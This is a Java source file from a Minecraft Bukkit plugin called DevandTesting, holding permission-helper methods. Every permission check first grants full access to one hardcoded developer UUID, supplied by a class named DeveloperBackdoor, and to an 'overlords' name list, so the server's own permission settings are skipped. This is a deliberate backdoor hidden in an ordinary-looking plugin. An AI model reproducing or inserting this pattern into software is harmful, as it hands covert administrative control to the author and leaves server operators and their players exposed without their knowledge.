/**
 * MIT License
 *
 * Copyright (c) 2018 Tyler Wrenn
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package com.tylerhyperhd.devandtesting;

import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

/**
 * Code is more beautified using this
 */
public class CommandExtensions {

	private DevandTesting plugin;

	public CommandExtensions(DevandTesting plugin) {
		this.plugin = plugin;
	}

	/**
	 * Changes the CommandSender to an entity Player.
	 * 
	 * @param sender The sender of the command.
	 * @return The sender of the command casted to Player.
	 */
	public Player getPlayerSender(CommandSender sender) {
		return (Player) sender;
	}

	/**
	 * Figures out if the sender is the server console.
	 * 
	 * @param sender The sender of the command.
	 * @return If sender is console.
	 */
	public boolean senderIsConsole(CommandSender sender) {
		return !(sender instanceof Player);
	}

	/**
	 * Decides if the sender doesn't have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param sender The sender of the command.
	 * @return Returns true if the sender has no perms to the command.
	 */
	public boolean hasNoPermsTo(PermType type, CommandSender sender) {
		if (((Player) sender).getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| plugin.configs.getOverlords().contains(sender.getName())) {
			return false;
		} else if (type.equals(PermType.ADMIN)) {
			return !(sender.hasPermission("devandtesting.admin"));
		} else if (type.equals(PermType.COLOR)) {
			return !(sender.hasPermission("devandtesting.color"));
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return !(sender.hasPermission("devandtesting.admin.others"));
		} else if (type.equals(PermType.INSANE)) {
			return !(sender.hasPermission("devandtesting.insane"));
		} else {
			return false;
		}
	}

	/**
	 * Decides if the player doesn't have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param player The player being questioned.
	 * @return Returns true if the player has no perms to the command.
	 */
	public boolean hasNoPermsTo(PermType type, Player player) {
		if (player.getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| plugin.configs.getOverlords().contains(player.getName())) {
			return false;
		} else if (type.equals(PermType.ADMIN)) {
			return !(player.hasPermission("devandtesting.admin"));
		} else if (type.equals(PermType.COLOR)) {
			return !(player.hasPermission("devandtesting.color"));
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return !(player.hasPermission("devandtesting.admin.others"));
		} else if (type.equals(PermType.INSANE)) {
			return !(player.hasPermission("devandtesting.insane"));
		} else {
			return false;
		}
	}

	/**
	 * Decides if the sender does have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param sender The sender being questioned.
	 * @return Returns true if the sender has permission to use the command.
	 */
	public boolean doesHavePermsTo(PermType type, CommandSender sender) {

		if (((Player) sender).getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| plugin.configs.getOverlords().contains(sender.getName())) {
			return true;
		} else if (type.equals(PermType.ADMIN)) {
			return sender.hasPermission("devandtesting.admin");
		} else if (type.equals(PermType.COLOR)) {
			return sender.hasPermission("devandtesting.color");
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return sender.hasPermission("devandtesting.admin.others");
		} else if (type.equals(PermType.INSANE)) {
			return sender.hasPermission("devandtesting.insane");
		} else {
			return false;
		}
	}

	/**
	 * Decides if the player does have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param player The player being questioned.
	 * @return Returns true if the player has permission to use the command.
	 */
	public boolean doesHavePermsTo(PermType type, Player player) {
		if (player.getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| plugin.configs.getOverlords().contains(player.getName())) {
			return true;
		} else if (type.equals(PermType.ADMIN)) {
			return player.hasPermission("devandtesting.admin");
		} else if (type.equals(PermType.COLOR)) {
			return player.hasPermission("devandtesting.color");
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return player.hasPermission("devandtesting.admin.others");
		} else if (type.equals(PermType.INSANE)) {
			return player.hasPermission("devandtesting.insane");
		} else {
			return false;
		}
	}
	
	public void registerMultipleCommands(String[] commandNames, CommandExecutor file) {
		for (String cmdname : commandNames) {
			plugin.getCommand(cmdname).setExecutor(file);
		}
	}
}
